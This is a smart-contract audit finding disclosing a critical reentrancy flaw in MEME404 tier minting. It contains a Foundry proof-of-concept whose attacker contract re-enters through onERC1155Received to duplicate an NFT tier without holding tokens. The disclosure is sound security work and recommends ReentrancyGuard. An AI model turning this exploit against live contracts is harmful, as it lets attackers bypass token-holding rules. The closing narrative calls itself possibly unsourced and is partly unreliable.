---
id: 5494
severity: "Critical"
---

# Reentrancy attack to duplicate NFT tier to other contracts

## Description

When minting a tier through the _mintTier() function, there is a callback function used when dealing with ERC1155 tokens. This callback is invoked when _checkERC1155Received() is called.
```solidity
if ((_owner.code.length != 0) && !_checkERC1155Received(_owner, msg.sender, address(0), tier.lowerId, 1)) {
    return;
}
```
A reentrancy attack is possible through the _mintTier() function. In this case, an attacker can duplicate their tier to other contracts, minting NFTs to these contracts without holding any MEME404 tokens. This reentrancy attack is only possible when using MEME1155 as a tier.
Path to execute the attack:
1. Attacker creates a contract to hold the duplicated 1155 with the onERC1155Received.
2. Attacker transfers all tokens to the contract created.
3. Through the reentrancy the contract sends all tokens back to the attacker before ﬁnish the execution of minting.
4. The attacker and the contract have now the same tier.
As a result the contract doesn't hold any token but could break any integration that requires a tier for a contract.

## Proof of Concept

```solidity
/// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.23;
import {Test, console2} from "forge-std/Test.sol";
import {MEME404} from "../../src/types/MEME404.sol";
import {IMEME404} from "../../src/interfaces/IMEME404.sol";
import {IMEME20} from "../../src/interfaces/IMEME20.sol";
import {TruglyFactoryNFT} from "../../src/TruglyFactoryNFT.sol";
import {ERC1155} from "@solmate/tokens/ERC1155.sol";
contract ReentrancyAttack {
    IMEME20 meme404;
    address owner;
    constructor(address _owner, address _meme404){
        meme404 = IMEME20(_meme404);
        owner = _owner;
    }
    function onERC1155Received(
        address,
        address,
        uint256,
        uint256,
        bytes calldata
    ) external virtual returns (bytes4) {
        // @audit can reenter here transferring tokens back to user
        console2.log("REENTER: ",meme404.balanceOf(address(this)));
        if(meme404.balanceOf(address(this)) != 0){
            meme404.transfer(owner, meme404.balanceOf(address(this)));
        }
        return ReentrancyAttack.onERC1155Received.selector;
    }
}
contract ReenterMeme404Test is Test {
    TruglyFactoryNFT nftFactory;
    MEME404 meme404;
    address memeception;
    address creator;
    address pool;
    address user;
    ReentrancyAttack attacker;
    function setUp() public virtual {
        nftFactory = new TruglyFactoryNFT();
        memeception = makeAddr("memeception");
        creator = makeAddr("creator");
        pool = makeAddr("pool");
        user = makeAddr("user");
        meme404 = new MEME404("Meme 404", "404", memeception, creator, address(nftFactory));
        attacker = new ReentrancyAttack(user, address(meme404));
    }
    function test_Meme404_Reentrancy() public {
        IMEME404.TierCreateParam[] memory tierParams = new IMEME404.TierCreateParam[](1);
        /// Fungible Tiers
        tierParams[0] =
        IMEME404.TierCreateParam({
            baseURL: "https://nft.com/",
            nftName: "1155 NFT A",
            nftSymbol: "1155",
            amountThreshold: 10 ether,
            nftId: 1,
            lowerId: 1,
            upperId: 1,
            isFungible: true
        });
        address[] memory exempt = new address[](0);
        // @audit initialize the tiers and the meme20
        meme404.initializeTiers(tierParams, exempt);
        vm.startPrank(memeception);
        meme404.transfer(user, 10 ether);
        meme404.initialize(
            creator,
            memeception,
            50,
            80,
            pool,
            exempt,
            exempt
        );
        vm.stopPrank();
        address nftA = meme404.nftIdToAddress(1);
        uint256 nftUserBefore = ERC1155(nftA).balanceOf(user, 1);
        assertEq(nftUserBefore, 1);
        // @audit transfer tokens from user to attacker to initia the reentrancy
        vm.prank(user);
        meme404.transfer(address(attacker), 10 ether);
        // @audit the user keeps the 1155
        uint256 nftUserAfter = ERC1155(nftA).balanceOf(user, 1);
        assertEq(nftUserAfter, 1);
        uint256 balanceUser = meme404.balanceOf(user);
        assertEq(balanceUser, 10 ether);
        // @audit the attacker contract keeps the 1155 but without balance
        uint256 nftAttackerAfter = ERC1155(nftA).balanceOf(address(attacker), 1);
        assertEq(nftAttackerAfter, 1);
        uint256 balanceAttacker = meme404.balanceOf(address(attacker));
        assertEq(balanceAttacker, 0);
    }
}
```

## Recommendation

Add the OZ ReentrancyGuard to the functions.

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability is a reentrancy flaw that occurs during the minting of an ERC1155‑based tier through the internal _mintTier function. When the contract attempts to transfer a newly minted tier to a recipient, it invokes the ERC1155 receiver callback via _checkERC1155Received. Because the callback is executed before the minting function finishes updating its internal state, a malicious contract can implement onERC1155Received and re‑enter the minting flow, transferring the MEME404 tokens back to the attacker while the original call still believes the tokens are held. The root cause is the lack of a reentrancy guard and the ordering of external calls before the contract’s state is fully settled. An attacker can therefore duplicate the tier to an arbitrary contract without actually possessing the required MEME404 balance. The exploit proceeds by first deploying a contract that implements onERC1155Received, then receiving the tier, and inside the callback sending all MEME404 tokens back to the attacker before the minting function returns. As a result the attacker’s contract ends up with a valid tier identifier but a zero token balance, breaking any downstream logic that assumes a tier holder must hold a positive MEME404 balance. This can cause integrations that check tier ownership to fail, users to see their NFT tier appear but receive no benefits, and overall protocol accounting to become inconsistent. The issue was discovered during a manual audit that examined the minting path and identified the external call to the ERC1155 receiver as a reentrancy entry point. It is hard to notice because the transaction does not revert and the tier appears to be minted successfully, masking the underlying balance discrepancy. The proper mitigation is to apply a reentrancy protection mechanism such as OpenZeppelin’s ReentrancyGuard, or to restructure the code so that all state changes occur before any external call, following the checks‑effects‑interactions pattern. Conceptually, this is a classic reentrancy vulnerability applied to an ERC1155 receipt hook, similar in nature to the DAO attack but confined to tier minting logic. From a user’s perspective the UI may show that the tier NFT has been granted while the associated token balance is unexpectedly zero, leading to confusion when expected rewards or permissions are missing. The protocol’s business rule that “holding a tier requires holding the corresponding MEME404 tokens” is violated, allowing an attacker to bypass the economic requirement without actually owning the tokens.
